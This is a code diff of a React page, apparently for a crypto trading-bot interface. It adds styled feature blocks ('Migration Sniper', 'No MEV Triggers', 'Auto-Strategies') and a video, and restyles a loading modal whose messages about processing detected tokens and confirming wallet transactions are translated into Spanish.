+                    border: '1px solid #222'
+                  }}>
+                    <div className="feature-header" style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem'
+                    }}>
+                      <div className="feature-icon" style={{
+                        width: '24px',
+                        height: '24px',
+                        color: '#fff',
+                        display: 'flex',
+                        justifyContent: 'center',
+                        alignItems: 'center'
+                      }}>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" stroke="currentColor" strokeWidth="2" fill="none"/>
+                        </svg>
+                      </div>
+                      <div className="feature-content">
+                        <h3 style={{
+                          color: '#fff',
+                          fontSize: '1.1rem',
+                          margin: 0
+                        }}>Migration Sniper</h3>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="feature-block" style={{
+                    padding: '1rem',
+                    backgroundColor: '#111',
+                    borderRadius: '8px',
+                    border: '1px solid #222'
+                  }}>
+                    <div className="feature-header" style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem'
+                    }}>
+                      <div className="feature-icon" style={{
+                        width: '24px',
+                        height: '24px',
+                        color: '#fff',
+                        display: 'flex',
+                        justifyContent: 'center',
+                        alignItems: 'center'
+                      }}>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <rect x="3" y="3" width="18" height="18" rx="2" ry="2" stroke="currentColor" strokeWidth="2" fill="none"/>
+                          <line x1="9" y1="9" x2="15" y2="15" stroke="currentColor" strokeWidth="2"/>
+                          <line x1="15" y1="9" x2="9" y2='15' stroke="currentColor" strokeWidth="2"/>
+                        </svg>
+                      </div>
+                      <div className="feature-content">
+                        <h3 style={{
+                          color: '#fff',
+                          fontSize: '1.1rem',
+                          margin: 0
+                        }}>No MEV Triggers</h3>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="feature-block" style={{
+                    padding: '1rem',
+                    backgroundColor: '#111',
+                    borderRadius: '8px',
+                    border: '1px solid #222'
+                  }}>
+                    <div className="feature-header" style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem'
+                    }}>
+                      <div className="feature-icon" style={{
+                        width: '24px',
+                        height: '24px',
+                        color: '#fff',
+                        display: 'flex',
+                        justifyContent: 'center',
+                        alignItems: 'center'
+                      }}>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" stroke="currentColor" strokeWidth="2" fill="none"/>
+                          <line x1="4" y1="22" x2="4" y2="15" stroke="currentColor" strokeWidth="2"/>
+                        </svg>
+                      </div>
+                      <div className="feature-content">
+                        <h3 style={{
+                          color: '#fff',
+                          fontSize: '1.1rem',
+                          margin: 0
+                        }}>Auto-Strategies</h3>
+                      </div>
+                    </div>
+                  </div>
+                </section>
+              </div>
+
+              <div className="video-right">
+                <section>
+                  <video 
+                    src="media/land-on-two-blocks.mp4"
+                    autoPlay
+                    loop
+                    muted
+                    playsInline
+                    style={{ width: '100%', borderRadius: '12px' }}
+                  />
+                </section>
+              </div>
+            </div>
+          </div>
         </div>
       </main>
 
-      {/* Loading modal */}
       {(isLoading || showProcessingModal) && (
-        <div style={styles.modalOverlay}>
-          <div style={styles.modalContainer}>
-            <div style={styles.spinner}></div>
-            <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
-              {showProcessingModal 
-                ? `Processing ${detectedTokensCount} detected tokens...` 
-                : loadingMessage}
-            </p>
-            <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
-              Please wait, this may take several minutes...
-              <br />
-              {showProcessingModal && 'Your wallet will open to confirm transactions.'}
-            </p>
-          </div>
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          backgroundColor: 'rgba(0, 0, 0, 0.8)',
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          zIndex: 1000,
+          flexDirection: 'column'
+        }}>
+          <div style={{
+            width: '50px',
+            height: '50px',
+            border: '5px solid #f3f3f3',
+            borderTop: '5px solid #0070f3',
+            borderRadius: '50%',
+            animation: 'spin 1s linear infinite',
+            marginBottom: '20px'
+          }}></div>
+          <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
+            {showProcessingModal 
+              ? `Procesando ${detectedTokensCount} tokens detectados...` 
+              : loadingMessage}
+          </p>
+          <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
+            Por favor espere, esto puede tomar varios minutos...
+            <br />
+            {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
+          </p>
         </div>
       )}
 
-      {/* Spinner animation */}
       <style jsx>{`
         @keyframes spin {
           0% { transform: rotate(0deg); }
